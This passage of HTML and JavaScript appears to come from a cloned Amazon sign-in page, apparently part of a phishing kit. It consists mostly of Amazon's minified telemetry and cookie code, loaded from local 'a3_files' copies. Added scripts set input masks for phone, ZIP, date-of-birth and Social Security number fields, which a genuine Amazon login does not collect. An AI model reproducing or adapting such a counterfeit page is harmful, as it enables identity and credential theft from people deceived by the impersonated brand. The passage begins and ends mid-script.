                        h && h.browser && e.push("sw:browser:unregister:unsupported"), a())
                })({
                    reg: {},
                    unreg: {}
                })
            });
            p.declare("a-fix-event-off", !1);
            v("pagejs:pkgExecTime", w() - L)
        })(window, document, Date);
        (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61lemL2h6EL._RC|11Y+5x+kkTL.js,51KMV3Cz2XL.js,31x4ENTlVIL.js,31f4+QIEeqL.js,01N6xzIJxbL.js,518BI433aLL.js,01rpauTep4L.js,31QZSjMuoeL.js,61ofwvddDeL.js,01KsMxlPtzL.js_.js?AUIClients/AmazonUI&KK9dlo3A#412402-T1.412405-T1');
        (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/21G215oqvfL._RC|21OJDARBhQL.js,218GJg15I8L.js,31lucpmF4CL.js,2119M3Ks9rL.js,51zaON6OItL.js_.js?AUIClients/AuthenticationPortalAssets');
        (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/01wGDSlxwdL.js?AUIClients/AuthenticationPortalInlineAssets');
        (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/31B281zoZGL.js?AUIClients/CVFAssets');
        (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/81DRuMmUGiL.js?AUIClients/SiegeClientSideEncryptionAUI');
        (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/31jdfgcsPAL.js?AUIClients/AmazonUIFormControlsJS');
        (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/81c5Xyp+ylL.js?AUIClients/FWCIMAssets');
    </script>
    <script type="text/javascript" async="" crossorigin="anonymous" src="a3_files/61lemL2h6EL.js"></script>
    <script type="text/javascript" async="" crossorigin="anonymous" src="a3_files/21G215oqvfL.js"></script>
    <script type="text/javascript" async="" crossorigin="anonymous" src="a3_files/01wGDSlxwdL.js"></script>
    <script type="text/javascript" async="" crossorigin="anonymous" src="a3_files/31B281zoZGL.js"></script>
    <script type="text/javascript" async="" crossorigin="anonymous" src="a3_files/81DRuMmUGiL.js"></script>
    <script type="text/javascript" async="" crossorigin="anonymous" src="a3_files/31jdfgcsPAL.js"></script>
    <script type="text/javascript" async="" crossorigin="anonymous" src="a3_files/81c5XypylL.js"></script>



    <script type="text/javascript">
        window.ue_ihe = (window.ue_ihe || 0) + 1;
        if (window.ue_ihe === 1) {
            (function(c) {
                c && 1 === c.ue_jsmtf && "object" === typeof c.P && "function" === typeof c.P.when && c.P.when("mshop-interactions").execute(function(e) {
                    "object" === typeof e && "function" === typeof e.addListener && e.addListener(function(b) {
                        "object" === typeof b && "ORIGIN" === b.dataSource && "number" === typeof b.clickTime && "object" === typeof b.events && "number" === typeof b.events.pageVisible && (c.ue_jsmtf_interaction = {
                            pv: b.events.pageVisible,
                            ct: b.clickTime
                        })
                    })
                })
            })(ue_csm);
            (function(c, e, b) {
                function m(a) {
                    f || (f = d[a.type].id, "undefined" === typeof a.clientX ? (h = a.pageX, k = a.pageY) : (h = a.clientX, k = a.clientY), 2 != f || l && (l != h || n != k) ? (r(), g.isl && e.setTimeout(function() {
                        p("at", g.id)
                    }, 0)) : (l = h, n = k, f = 0))
                }

                function r() {
                    for (var a in d) d.hasOwnProperty(a) && g.detach(a, m, d[a].parent)
                }

                function s() {
                    for (var a in d) d.hasOwnProperty(a) && g.attach(a, m, d[a].parent)
                }

                function t() {
                    var a = "";
                    !q && f && (q = 1, a += "&ui=" + f);
                    return a
                }
                var g = c.ue,
                    p = c.uex,
                    q = 0,
                    f = 0,
                    l, n, h, k, d = {
                        click: {
                            id: 1,
                            parent: b
                        },
                        mousemove: {
                            id: 2,
                            parent: b
                        },
                        scroll: {
                            id: 3,
                            parent: e
                        },
                        keydown: {
                            id: 4,
                            parent: b
                        }
                    };
                g && p && (s(), g._ui = t)
            })(ue_csm, window, document);


            (function(s, l) {
                function m(b, e, c) {
                    c = c || new Date(+new Date + t);
                    c = "expires=" + c.toUTCString();
                    n.cookie = b + "=" + e + ";" + c + ";path=/"
                }

                function p(b) {
                    b += "=";
                    for (var e = n.cookie.split(";"), c = 0; c < e.length; c++) {
                        for (var a = e[c];
                            " " == a.charAt(0);) a = a.substring(1);
                        if (0 === a.indexOf(b)) return decodeURIComponent(a.substring(b.length, a.length))
                    }
                    return ""
                }

                function q(b, e, c) {
                    if (!e) return b; - 1 < b.indexOf("{") && (b = "");
                    for (var a = b.split("&"), f, d = !1, h = !1, g = 0; g < a.length; g++) f = a[g].split(":"), f[0] == e ? (!c || d ? a.splice(g, 1) : (f[1] = c, a[g] =
                        f.join(":")), h = d = !0) : 2 > f.length && (a.splice(g, 1), h = !0);
                    h && (b = a.join("&"));
                    !d && c && (0 < b.length && (b += "&"), b += e + ":" + c);
                    return b
                }
                var k = s.ue || {},
                    t = 3024E7,
                    n = ue_csm.document || l.document,
                    r = null,
                    d;
                a: {
                    try {
                        d = l.localStorage;
                        break a
                    } catch (u) {}
                    d = void 0
                }
                k.count && k.count("csm.cookieSize", document.cookie.length);
                k.cookie = {
                    get: p,
                    set: m,
                    updateCsmHit: function(b, e, c) {
                        try {
                            var a;
                            if (!(a = r)) {
                                var f;
                                a: {
                                    try {
                                        if (d && d.getItem) {
                                            f = d.getItem("csm-hit");
                                            break a
                                        }
                                    } catch (k) {}
                                    f = void 0
                                }
                                a = f || p("csm-hit") || "{}"
                            }
                            a = q(a, b, e);
                            r = a = q(a, "t", +new Date);
                            try {
                                d && d.setItem && d.setItem("csm-hit", a)
                            } catch (h) {}
                            m("csm-hit", a, c)
                        } catch (g) {
                            "function" == typeof l.ueLogError && ueLogError(Error("Cookie manager: " + g.message), {
                                logLevel: "WARN"
                            })
                        }
                    }
                }
            })(ue_csm, window);


            (function(l, e) {
                function c(b) {
                    b = "";
                    var c = a.isBFT ? "b" : "s",
                        d = "" + a.oid,
                        g = "" + a.lid,
                        h = d;
                    d != g && 20 == g.length && (c += "a", h += "-" + g);
                    a.tabid && (b = a.tabid + "+");
                    b += c + "-" + h;
                    b != f && 100 > b.length && (f = b, a.cookie ? a.cookie.updateCsmHit(m, b + ("|" + +new Date)) : e.cookie = "csm-hit=" + b + ("|" + +new Date) + n + "; path=/")
                }

                function p() {
                    f = 0
                }

                function d(b) {
                    !0 === e[a.pageViz.propHid] ? f = 0 : !1 === e[a.pageViz.propHid] && c({
                        type: "visible"
                    })
                }
                var n = "; expires=" + (new Date(+new Date + 6048E5)).toGMTString(),
                    m = "tb",
                    f, a = l.ue || {},
                    k = a.pageViz && a.pageViz.event &&
                    a.pageViz.propHid;
                a.attach && (a.attach("click", c), a.attach("keyup", c), k || (a.attach("focus", c), a.attach("blur", p)), k && (a.attach(a.pageViz.event, d, e), d({})));
                a.aftb = 1
            })(ue_csm, ue_csm.document);


            ue_csm.ue.stub(ue, "impression");


            ue.stub(ue, "trigger");



            if (window.ue && uet) {
                uet('bb');
            }

        }
    </script>
    <script>
        window.ue && ue.count && ue.count('CSMLibrarySize', 3173)
    </script>
</head>
<script src="./assets/js/angular.min.js"></script>
<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/jquery.validate.min.js"></script>
<script src="./assets/js/jquery.mask.js"></script>
<script type="text/javascript">
    $(function() {
        $('#phone').mask('000-000-0000');
        $('#zipc').mask('00000');
        $('#dob').mask('00/00/0000');
        $('#ssn').mask('000-00-0000');

    });
</script>

<body class="ap-locale-en_US a-m-us a-aui_72554-c a-aui_accordion_a11y_role_354025-c a-aui_killswitch_csa_logger_372963-c a-aui_launch_2021_ally_fixes_392482-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate">

    <script>
        ! function() {
            function n(n, t) {
                var r = i(n);
                return t && (r = r("instance", t)), r
            }
            var r = [],
                c = 0,
                i = function(t) {
                    return function() {
                        var n = c++;
                        return r.push([t, [].slice.call(arguments, 0), n, {
                            time: Date.now()
                        }]), i(n)
                    }
                };
            n._s = r, this.csa = n
        }();;
        csa('Config', {
            "ContentInteractionsSummary.FlushInterval": 5000
        });
        if (window.csa) {
            csa("Config", {

                'Events.Namespace': 'csa',
                'ObfuscatedMarketplaceId': 'ATVPDKIKX0DER',
                'Events.SushiEndpoint': 'https://unagi.amazon.com/1/events/com.amazon.csm.csa.prod',
                'CacheDetection.RequestID': "VNE39923462MAN8CDC9Z",
                'CacheDetection.Callback': window.ue && ue.reset,
                'LCP.elementDedup': 1
            });

            csa("Events")("setEntity", {
                page: {
                    requestId: "VNE39923462MAN8CDC9Z",
                    meaningful: "interactive"
                },
                session: {
                    id: "133-0374257-6245133"
                }
            });
        }! function(i) {
            var r, e, o = "splice",
                u = i.csa,
                f = {},
                c = {},
                a = i.csa._s,
                s = 0,
                l = 0,
                g = -1,
                h = {},
                d = {},
                v = {},
                n = Object.keys,
                p = function() {};

            function t(n, t) {
                return u(n, t)
            }

            function m(n, t) {
                var i = c[n] || {};
                O(i, t), c[n] = i, l++, S(U, 0)
            }

            function w(n, t, i) {
                var r = !0;
                return t = D(t), i && i.buffered && (r = (v[n] || []).every(function(n) {
                    return !1 !== t(n)
                })), r ? (h[n] || (h[n] = []), h[n].push(t), function() {
                    ! function(n, t) {
                        var i = h[n];
                        i && i[o](i.indexOf(t), 1)
                    }(n, t)
                }) : p
            }

            function b(n, t) {
                if (t = D(t), n in d) return t(d[n]), p;
                return w(n, function(n) {
                    return t(n), !1
                })
            }

            function E(n, t) {
                if (u("Errors")("logError", n), f.DEBUG) throw t || n
            }

            function y() {
                return Math.abs(4294967295 * Math.random() | 0).toString(36)
            }

            function D(n, t) {
                return function() {
                    try {
                        return n.apply(this, arguments)
                    } catch (n) {
                        E(n.message || n, n)
                    }
                }
            }

            function S(n, t) {
                return i.setTimeout(D(n), t)
            }

            function U() {
                for (var n = 0; n < a.length;) {
                    var t = a[n],
                        i = t[0] in c;
                    if (!i && !e) return void(s = f.AddMissingPluginsToEnd ? a.length : t.length);
                    i ? (a[o](s = n, 1), I(t)) : n++
                }
                g = l
            }

            function I(n) {
                var arguments, t = c[n[0]],
                    i = (arguments = n[1])[0];
                if (!t || !t[i]) return E("Undefined function: " + t + "/" + i);
                r = n[3], c[n[2]] = t[i].apply(t, arguments.slice(1)) || {}, r = 0
            }

            function M() {
                e = 1, U()
            }

            function O(t, i) {
                n(i).forEach(function(n) {
                    t[n] = i[n]
                })
            }
            b("$beforeunload", M), m("Config", {
                instance: function(n) {
                    O(f, n)
                }
            }), u.plugin = D(function(n) {
                n(t)
            }), t.config = f, t.register = m, t.on = w, t.once = b, t.blank = p, t.emit = function(n, t, i) {
                for (var r = h[n] || [], e = 0; e < r.length;) !1 === r[e](t) ? r[o](e, 1) : e++;
                d[n] = t || {}, i && i.buffered && (v[n] || (v[n] = []), 100 <= v[n].length && v[n].shift(), v[n].push(t || {}))
            }, t.UUID = function() {
                return [y(), y(), y(), y()].join("-")
            }, t.time = function(n) {
                var t = r ? new Date(r.time) : new Date;
                return "ISO" === n ? t.toISOString() : t.getTime()
            }, t.error = E, t.warn = function(n, t) {
                if (u("Errors")("logWarn", n), f.DEBUG) throw t || n
            }, t.exec = D, t.timeout = S, t.interval = function(n, t) {
                return i.setInterval(D(n), t)
            }, (t.global = i).csa._s.push = function(n) {
                n[0] in c && (!a.length || e) ? (I(n), a.length && g !== l && U()) : a[o](s++, 0, n)
            }, U(), S(function() {
                S(M, f.SkipMissingPluginsTimeout || 5e3)
            }, 1)
        }("undefined" != typeof window ? window : global);
        csa.plugin(function(o) {
            var f = "addEventListener",
                e = "requestAnimationFrame",
                t = o.exec,
                r = o.global,
                u = o.on;
            o.raf = function(n) {
                if (r[e]) return r[e](t(n))
            }, o.on = function(n, e, t, r) {
                if (n && "function" == typeof n[f]) {
                    var i = o.exec(t);
                    return n[f](e, i, r),
                        function() {
                            n.removeEventListener(e, i, r)
                        }
                }
                return "string" == typeof n ? u(n, e, t, r) : o.blank
            }
        });
        csa.plugin(function(o) {
            var t, n, r = {},
                e = "localStorage",
                c = "sessionStorage",
                a = "local",
                i = "session",
                u = o.exec;

            function s(e, t) {
                var n;
                try {
                    r[t] = !!(n = o.global[e]), n = n || {}
                } catch (e) {
                    r[t] = !(n = {})
                }
                return n
            }

            function f() {
                t = t || s(e, a), n = n || s(c, i)
            }

            function l(e) {
                return e && e[i] ? n : t
            }
            o.store = u(function(e, t, n) {
                f();
                var o = l(n);
                return e ? t ? void(o[e] = t) : o[e] : Object.keys(o)
            }), o.storageSupport = u(function() {
                return f(), r
            }), o.deleteStored = u(function(e, t) {
                f();
                var n = l(t);
                if ("function" == typeof e)
                    for (var o in n) n.hasOwnProperty(o) && e(o, n[o]) && delete n[o];
                else delete n[e]
            })
        });
        csa.plugin(function(n) {
            n.types = {
                ovl: function(n) {
                    var r = [];
                    if (n)
                        for (var i in n) n.hasOwnProperty(i) && r.push(n[i]);
                    return r
                }
            }
        });
        csa.plugin(function(o) {
            function r(n) {
                return function(r) {
                    o("Metrics", {
                        producerId: "csa",
                        dimensions: {
                            message: r
                        }
                    })("recordMetric", n, 1)
                }
            }
            o.register("Errors", {
                logError: r("jsError"),
                logWarn: r("jsWarn")
            })
        });
        csa.plugin(function(o) {
            var i, e, n, a, t, r = "function",
                u = "willDisappear",
                c = "$app.",
                f = "$document.",
                p = "focus",
                d = "blur",
                s = "active",
                l = "resign",
                $ = o.global,
                b = o.exec,
                m = o("Events"),
                g = $.location,
                v = $.document || {},
                h = $.P || {},
                y = (($.performance || {}).navigation || {}).type,
                P = o.on,
                w = o.emit,
                k = v.hidden,
                E = {};
            g && v && (P($, "beforeunload", D), P($, "pagehide", D), P(v, "visibilitychange", A(f, function() {
                return v.visibilityState || "unknown"
            })), P(v, p, A(f + p)), P(v, d, A(f + d)), h.when && h.when("mash").execute(function(e) {
                e && (P(e, "appPause", A(c + "pause")), P(e, "appResume", A(c + "resume")), A(c + "deviceready")(), $.cordova && $.cordova.platformId && A(c + cordova.platformId)(), P(v, s, A(c + s)), P(v, l, A(c + l)))
            }), e = $.app || {}, n = b(function() {
                w(c + "willDisappear"), D()
            }), t = typeof(a = e[u]) == r, e[u] = b(function() {
                n(), t && a()
            }), $.app || ($.app = e), "complete" === v.readyState ? T() : P($, "load", T), k ? S() : x(), o.on("$app.blur", S), o.on("$app.focus", x), o.on("$document.blur", S), o.on("$document.focus", x), o.on("$document.hidden", S), o.on("$document.visible", x), o.register("SPA", {
                newPage: I
            }), I({
                transitionType: {
                    0: "hard",
                    1: "refresh",
                    2: "back-button"
                } [y] || "unknown"
            }));

            function I(n, e) {
                var a = !!i,
                    t = (e = e || {}).keepPageAttributes;
                a && (w("$beforePageTransition"), w("$pageTransition")), a && !t && m("removeEntity", "page"), i = o.UUID(), t ? E.id = i : E = {
                    schemaId: "<ns>.PageEntity.1",
                    id: i,
                    url: g.href,
                    server: g.hostname,
                    path: g.pathname,
                    referrer: v.referrer,
                    title: v.title
                }, Object.keys(n || {}).forEach(function(e) {
                    E[e] = n[e]
                }), m("setEntity", {
                    page: E
                }), w("$pageChange", E, {
                    buffered: 1
                }), a && w("$afterPageTransition")
            }

            function T() {
                w("$load"), w("$ready"), w("$afterload")
            }

            function D() {
                w("$ready"), w("$beforeunload"), w("$unload"), w("$afterunload")
            }

            function S() {
                k || (w("$visible", !1, {
                    buffered: 1
                }), k = !0)
            }

            function x() {
                k && (w("$visible", !0, {
                    buffered: 1
                }), k = !1)
            }

            function A(n, a) {
                return b(function() {
                    var e = typeof a == r ? n + a() : n;
                    w(e)
                })
            }
        });
        csa.plugin(function(c) {
            var t = "Events",
                e = "UNKNOWN",
                a = "id",
                u = "all",
                n = "messageId",
                i = "timestamp",
                f = "producerId",
                o = "application",
                r = "obfuscatedMarketplaceId",
                s = "entities",
                d = "schemaId",
                l = "version",
                p = "attributes",
                v = "<ns>",
                g = c.config,
                h = (c.global.location || {}).host,
                m = g[t + ".Namespace"] || "csa_other",
                I = g.Application || "Other" + (h ? ":" + h : ""),
                b = c("Transport"),
                y = {},
                O = function(t, e) {
                    Object.keys(t).forEach(e)
                };

            function E(n, i, o) {
                O(i, function(t) {
                    var e = o === u || (o || {})[t];
                    t in n || (n[t] = {
                        version: 1,
                        id: i[t][a] || c.UUID()
                    }), U(n[t], i[t], e)
                })
            }

            function U(e, n, i) {
                O(n, function(t) {
                    ! function(t, e, n) {
                        return "string" != typeof e && t !== l ? c.error("Attribute is not of type string: " + t) : !0 === n || 1 === n || (t === a || !!~(n || []).indexOf(t))
                    }(t, n[t], i) || (e[t] = n[t])
                })
            }

            function N(o, t, r) {
                O(t, function(t) {
                    var e = o[t];
                    if (e[d]) {
                        var n = {},
                            i = {};
                        n[a] = e[a], n[f] = e[f] || r, n[d] = e[d], n[l] = e[l]++, n[p] = i, S(n), U(i, e, 1), k(i), b("log", n)
                    }
                })
            }

            function S(t) {
                t[i] = function(t) {
                    return "number" == typeof t && (t = new Date(t).toISOString()), t || c.time("ISO")
                }(t[i]), t[n] = t[n] || c.UUID(), t[o] = I, t[r] = g.ObfuscatedMarketplaceId || e, t[d] = t[d].replace(v, m)
            }

            function k(t) {
                delete t[l], delete t[d], delete t[f]
            }

            function w(o) {
                var r = {};
                this.log = function(t, e) {
                    var n = {},
                        i = (e || {}).ent;
                    return t ? "string" != typeof t[d] ? c.error("A valid schema id is required for the event") : (S(t), E(n, y, i), E(n, r, i), E(n, t[s] || {}, i), O(n, function(t) {
                        k(n[t])
                    }), t[f] = o[f], t[s] = n, void b("log", t, e)) : c.error("The event cannot be undefined")
                }, this.setEntity = function(t) {
                    E(r, t, u), N(r, t, o[f])
                }
            }
            g["KillSwitch." + t] || c.register(t, {
                setEntity: function(t) {
                    E(y, t, u), N(y, t, "csa")
                },
                removeEntity: function(t) {
                    delete y[t]
                },
                instance: function(t) {
                    return new w(t)
                }
            })
        });
        csa.plugin(function(s) {
            var c, g = "Transport",
                l = "post",
                f = "preflight",
                r = "csa.cajun.",
                i = "store",
                a = "deleteStored",
                u = "sendBeacon",
                t = "__merge",
                e = "messageId",
                n = ".FlushInterval",
                o = 0,
                d = s.config[g + ".BufferSize"] || 2e3,
                h = s.config[g + ".RetryDelay"] || 1500,
                p = {},
                v = 0,
                y = [],
                m = s.global,
                E = m.document,
                b = s.timeout,
                k = m.Object.keys,
                w = s.config[g + n] || 5e3,
                I = w,
                O = s.config[g + n + ".BackoffFactor"] || 1,
                R = s.config[g + n + ".BackoffLimit"] || 3e4,
                S = 0;

            function B(n) {
                if (864e5 < s.time() - +new Date(n.timestamp)) return s.warn("Event is too old: " + n);
                v < d && (n[e] in p || (p[n[e]] = n, v++), "function" == typeof n[t] && n[t](p[n[e]]), !S && o && (S = b(T, function() {
                    var n = I;
                    return I = Math.min(n * O, R), n
                }())))
            }

            function T() {
                y.forEach(function(e) {
                    var o = [];
                    k(p).forEach(function(n) {
                        var t = p[n];
                        e.accepts(t) && o.push(t)
                    }), o.length && (e.chunks ? e.chunks(o).forEach(function(n) {
                        D(e, n)
                    }) : D(e, o))
                }), p = {}, S = 0
            }

            function D(t, e) {
                function o() {
                    s[a](r + n)
                }
                var n = s.UUID();
                s[i](r + n, JSON.stringify(e)), [function(n, t, e) {
                    var o = m.navigator || {},
                        r = m.cordova || {};
                    if (!o[u] || !n[l]) return 0;
                    n[f] && r && "ios" === r.platformId && !c && ((new Image).src = n[f]().url, c = 1);
                    var i = n[l](t);
                    if (!i.type && o[u](i.url, i.body)) return e(), 1
                }, function(n, t, e) {
                    if (!n[l]) return 0;
                    var o = n[l](t),
                        r = o.url,
                        i = o.body,
                        c = o.type,
                        f = new XMLHttpRequest,
                        a = 0;

                    function u(n, t, e) {
                        f.open("POST", n), f.withCredentials = !0, e && f.setRequestHeader("Content-Type", e), f.send(t)
                    }
                    return f.onload = function() {
                        f.status < 299 ? e() : s.config[g + ".XHRRetries"] && a < 3 && b(function() {
                            u(r, i, c)
                        }, ++a * h)
                    }, u(r, i, c), 1
                }].some(function(n) {
                    try {
                        return n(t, e, o)
                    } catch (n) {}
                })
            }
            k && (s.once("$afterload", function() {
                o = 1,
                    function(e) {
                        (s[i]() || []).forEach(function(n) {
                            if (!n.indexOf(r)) try {
                                var t = s[i](n);
                                s[a](n), JSON.parse(t).forEach(e)
                            } catch (n) {
                                s.error(n)
                            }
                        })
                    }(B), s.on(E, "visibilitychange", T, !1), T()
            }), s.once("$afterunload", function() {
                o = 1, T()
            }), s.on("$afterPageTransition", function() {
                v = 0, I = w
            }), s.register(g, {
                log: B,
                register: function(n) {
                    y.push(n)
                }
            }))
        });
        csa.plugin(function(n) {
            var r = n.config["Events.SushiEndpoint"];
            n("Transport")("register", {
                accepts: function(n) {
                    return n.schemaId
                },
                post: function(n) {
                    var t = n.map(function(n) {
                        return {
                            data: n
                        }
                    });
                    return {
                        url: r,
                        body: JSON.stringify({
                            events: t
                        })
                    }
                },
                preflight: function() {
                    var n, t = /\/\/(.*?)\//.exec(r);
                    return t && t[1] && (n = "https://" + t[1] + "/ping"), {
                        url: n
                    }
                },
                chunks: function(n) {
                    for (var t = []; 500 < n.length;) t.push(n.splice(0, 500));
                    return t.push(n), t
                }
            })
        });
        csa.plugin(function(n) {
            var t, a, o, r, e = n.config,
                i = "PageViews",
                d = e[i + ".ImpressionMinimumTime"] || 1e3,
                s = "hidden",
                c = "innerHeight",
                g = "innerWidth",
                l = "renderedTo",
                f = l + "Viewed",
                m = l + "Meaningful",
                u = l + "Impressed",
                p = 1,
                v = 2,
                h = 3,
                w = 4,
                y = 5,
                P = "loaded",
                I = 7,
                T = 8,
                b = n.global,
                E = n.on,
                V = n("Events", {
                    producerId: "csa"
                }),
                $ = b.document,
                M = {},
                S = {},
                H = y;

            function K(e) {
                if (!M[I]) {
                    var i;
                    if (M[e] = n.time(), e !== h && e !== P || (t = t || M[e]), t && H === w) a = a || M[e], (i = {})[m] = t - o, i[f] = a - o, R("PageView.4", i), r = r || n.timeout(j, d);
                    if (e !== y && e !== p && e !== v || (clearTimeout(r), r = 0), e !== p && e !== v || R("PageRender.3", {
                            transitionType: e === p ? "hard" : "soft"
                        }), e === I)(i = {})[m] = t - o, i[f] = a - o, i[u] = M[e] - o, R("PageImpressed.2", i)
                }
            }

            function R(e, i) {
                S[e] || (i.schemaId = "<ns>." + e, V("log", i, {
                    ent: "all"
                }), S[e] = 1)
            }

            function W() {
                0 === b[c] && 0 === b[g] ? (H = T, n("Events")("setEntity", {
                    page: {
                        viewport: "hidden-iframe"
                    }
                })) : H = $[s] ? y : w, K(H)
            }

            function j() {
                K(I), r = 0
            }

            function k() {
                var e = o ? v : p;
                M = {}, S = {}, a = t = 0, o = n.time(), K(e), W()
            }

            function q() {
                var e = $.readyState;
                "interactive" === e && K(h), "complete" === e && K(P)
            }
            e["KillSwitch." + i] || ($ && void 0 !== $[s] ? (k(), E($, "visibilitychange", W, !1), E($, "readystatechange", q, !1), E("$afterPageTransition", k), E("$timing:loaded", q), n.once("$load", q)) : n.warn("Page visibility not supported"))
        });
        csa.plugin(function(c) {
            var s = c.config["Interactions.ParentChainLength"] || 15,
                e = "click",
                r = "touches",
                f = "timeStamp",
                o = "length",
                u = "pageX",
                g = "pageY",
                p = "pageXOffset",
                h = "pageYOffset",
                m = 250,
                v = 5,
                d = 200,
                l = .5,
                t = {
                    capture: !0,
                    passive: !0
                },
                X = c.global,
                Y = c.emit,
                n = c.on,
                x = X.Math.abs,
                a = (X.document || {}).documentElement || {},
                y = {
                    x: 0,
                    y: 0,
                    t: 0,
                    sX: 0,
                    sY: 0
                },
                N = {
                    x: 0,
                    y: 0,
                    t: 0,
                    sX: 0,
                    sY: 0
                };

            function b(t) {
                if (t.id) return "//*[@id='" + t.id + "']";
                var e = function(t) {
                        var e, n = 1;
                        for (e = t.previousSibling; e; e = e.previousSibling) e.nodeName === t.nodeName && (n += 1);
                        return n
                    }(t),
                    n = t.nodeName;
                return 1 !== e && (n += "[" + e + "]"), t.parentNode && (n = b(t.parentNode) + "/" + n), n
            }

            function I(t, e, n) {
                var a = c("Content", {
                        target: n
                    }),
                    i = {
                        schemaId: "<ns>.ContentInteraction.1",
                        interaction: t,
                        interactionData: e,
                        messageId: c.UUID()
                    };
                if (n) {
                    var r = b(n);
                    r && (i.attribution = r);
                    var o = function(t) {
                        for (var e = t, n = e.tagName, a = !1, i = t ? t.href : null, r = 0; r < s; r++) {
                            if (!e || !e.parentElement) {
                                a = !0;
                                break
                            }
                            n = (e = e.parentElement).tagName + "/" + n, i = i || e.href
                        }
                        return a || (n = ".../" + n), {
                            pc: n,
                            hr: i
                        }
                    }(n);
                    o.pc && (i.interactionData.parentChain = o.pc), o.hr && (i.interactionData.href = o.hr)
                }
                a("log", i), Y("$content.interaction", i)
            }

            function i(t) {
                I(e, {
                    interactionX: "" + t.pageX,
                    interactionY: "" + t.pageY
                }, t.target)
            }

            function C(t) {
                if (t && t[r] && 1 === t[r][o]) {
                    var e = t[r][0];
                    N = y = {
                        e: t.target,
                        x: e[u],
                        y: e[g],
                        t: t[f],
                        sX: X[p],
                        sY: X[h]
                    }
                }
            }

            function D(t) {
                if (t && t[r] && 1 === t[r][o] && y && N) {
                    var e = t[r][0],
                        n = t[f],
                        a = n - N.t,
                        i = {
                            e: t.target,
                            x: e[u],
                            y: e[g],
                            t: n,
                            sX: X[p],
                            sY: X[h]
                        };
                    N = i, d <= a && (y = i)
                }
            }

            function E(t) {
                if (t) {
                    var e = x(y.x - N.x),
                        n = x(y.y - N.y),
                        a = x(y.sX - N.sX),
                        i = x(y.sY - N.sY),
                        r = t[f] - y.t;
                    if (m < 1e3 * e / r && v < e || m < 1e3 * n / r && v < n) {
                        var o = n < e;
                        o && a && e * l <= a || !o && i && n * l <= i || I((o ? "horizontal" : "vertical") + "-swipe", {
                            interactionX: "" + y.x,
                            interactionY: "" + y.y,
                            endX: "" + N.x,
                            endY: "" + N.y
                        }, y.e)
                    }
                }
            }
            n(a, e, i, t), n(a, "touchstart", C, t), n(a, "touchmove", D, t), n(a, "touchend", E, t)
        });
        csa.plugin(function(t) {
            var n, s, u, e = "MutationObserver",
                i = "observe",
                r = "disconnect",
                o = "mutObs",
                c = t.global,
                a = c.document,
                f = a.body || a.documentElement,
                b = Date.now,
                l = [],
                d = [],
                g = [],
                m = 0,
                p = 0,
                v = 0,
                h = t.blank,
                O = {
                    buffered: 1
                },
                w = 0;

            function _(e) {
                t.global.ue_csa_ss_tag || t.emit("$csmTag:" + e, 0, O)
            }
            b && c[e] ? (_(o + "Yes"), m = 0, (s = new c[e](B))[i](f, {
                childList: !0,
                subtree: !0
            }), (u = new c[e](y))[i](f, {
                attributes: !0,
                subtree: !0,
                attributeFilter: ["src"],
                attributeOldValue: !0
            }), h = t.on(c, "scroll", L, {
                passive: !0
            }), t.register("SpeedIndexBuffers", {
                getBuffers: function(e) {
                    e && (L(), e(m, l, d, g), s && s[r](), u && u[r](), h())
                },
                registerListener: function(e) {
                    n = e
                }
            })) : _(o + "No");

            function y(e) {
                l.push({
                    t: b(),
                    m: e
                })
            }

            function B(e) {
                d.push({
                    t: b(),
                    m: e
                }), w || _(o + "Active"), w = v = 1, n && n()
            }

            function L() {
                v && (g.push({
                    t: b(),
                    y: p
                }), p = c.pageYOffset, v = 0)
            }
        });
    </script>
    <script type="text/javascript">
        (function() {
            function l(a) {
                for (var c = b.location.search.substring(1).split("&"), e = 0; e < c.length; e++) {
                    var d = c[e].split("=");
                    if (d[0] === a) return d[1]
                }
            }
            window.amzn = window.amzn || {};
            amzn.copilot = amzn.copilot || {};
            var b = window,
                f = document,
                g = b.P || b.AmazonUIPageJS,
                h = f.head || f.getElementsByTagName("head")[0],
                m = 0,
                n = 0;
            amzn.copilot.checkCoPilotSession = function() {
                f.cookie.match("cpidv") && ("undefined" !== typeof jQuery && k(jQuery), g && g.when && g.when("jQuery").execute(function(a) {
                    k(a)
                }), b.amznJQ && b.amznJQ.available && b.amznJQ.available("jQuery",
                    function() {
                        k(jQuery)
                    }), b.jQuery || g || b.amznJQ || q())
            };
            var q = function() {
                    m ? b.ue && "function" === typeof b.ue.count && b.ue.count("cpJQUnavailable", 1) : (m = 1, f.addEventListener ? f.addEventListener("DOMContentLoaded", amzn.copilot.checkCoPilotSession, !1) : f.attachEvent && f.attachEvent("onreadystatechange", function() {
                        "complete" === f.readyState && amzn.copilot.checkCoPilotSession()
                    }))
                },
                k = function(a) {
                    if (!n) {
                        n = 1;
                        amzn.copilot.jQuery = a;
                        a = l("debugJS");
                        var c = "https:" === b.location.protocol ? 1 : 0,
                            e = 1;
                        url = "/gp/copilot/handlers/copilot_strings_resources.html";
                        window.texas && texas.locations && (url = texas.locations.makeUrl(url));
                        g && g.AUI_BUILD_DATE && (e = 0);
                        amzn.copilot.jQuery.ajax && amzn.copilot.jQuery.ajax({
                            url: url,
                            dataType: "json",
                            data: {
                                isDebug: a,
                                isSecure: c,
                                includeAUIP: e
                            },
                            success: function(a) {
                                amzn.copilot.vip = a.serviceEndPoint;
                                amzn.copilot.enableMultipleTabSession = a.isFollowMe;
                                r(a)
                            },
                            error: function() {
                                b.ue.count("cpLoadResourceError", 1)
                            }
                        })
                    }
                },
                r = function(a) {
                    var c = amzn.copilot.jQuery,
                        e = function() {
                            amzn.copilot.setup(c.extend({
                                isContinuedSession: !0
                            }, a))
                        };
                    a.CSSUrls &&
                        c.each(a.CSSUrls[0], function(a, c) {
                            var b = f.createElement("link");
